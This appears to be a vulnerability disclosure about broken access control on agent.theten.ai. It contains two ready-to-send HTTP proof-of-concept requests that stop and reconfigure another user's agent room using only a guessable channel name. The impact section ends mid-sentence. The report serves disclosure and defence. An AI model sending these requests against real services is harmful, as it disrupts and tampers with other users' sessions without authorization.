### Summary
A large number of interfaces only determine user identity through the parameter channel_name without performing permission verification  
**resulting in a large number of unauthorized vulnerabilities All interfaces have not undergone permission verification** 

**Allowing attackers to close other people's connections and data based on the channel name**



We can regard https://agent.theten.ai/home as victim example  
Use two accounts to replicate this operation
### DETAIL
1. Victim login  

![image](https://github.com/user-attachments/assets/5dd3199b-16fe-4496-9482-d1827374bb24)
Notice The channel name 

2. Attackers send data packets (Assume attcker guess the right victim channel name[quiet easy]) 

![image](https://github.com/user-attachments/assets/f3190e3c-373c-4041-bcd1-47275d628ba7)
POC 
```
POST /api/agents/stop HTTP/2
Host: agent.theten.ai
Content-Length: 85
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Origin: https://agent.theten.ai
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://agent.theten.ai/home
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"request_id":"6182c335-2eb9-4f64-8c87-510b953d52b312","channel_name":"agora_02nq0h"}
```
The channel name can be traversed own By victim, and after this request is sent, the corresponding room will pause the connection

3. Users can reset the link properties in room by accessing the POST/app/agents/start interface
Note that there is no association between user_id and channel
![image](https://github.com/user-attachments/assets/abc831e8-e9f9-40a2-8454-84729ab5ccc3)
```
POST /api/agents/start HTTP/2
Host: agent.theten.ai
Content-Length: 178
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Origin: https://agent.theten.ai
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://agent.theten.ai/home
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

{"request_id":"094a98a1-ece7-4906-95c5-bc3a877932a7","channel_name":"agora_02nq0h","user_uid":119866,"graph_name":"camera.va.openai.azure","language":"zh-CN","voice_type":"male"}
```


4. We edited the graph_name as separate data, but it was not displayed on the user's frontend, but it did indeed change in the backend

![image](https://github.com/user-attachments/assets/8e37fdd6-647e-4bd8-9faa-a94bbd2eb893)  




#### impact
Being able to modify someone else's room configuration beyond their authority and creating DOS vulnerabilities in their use of the room,Besides
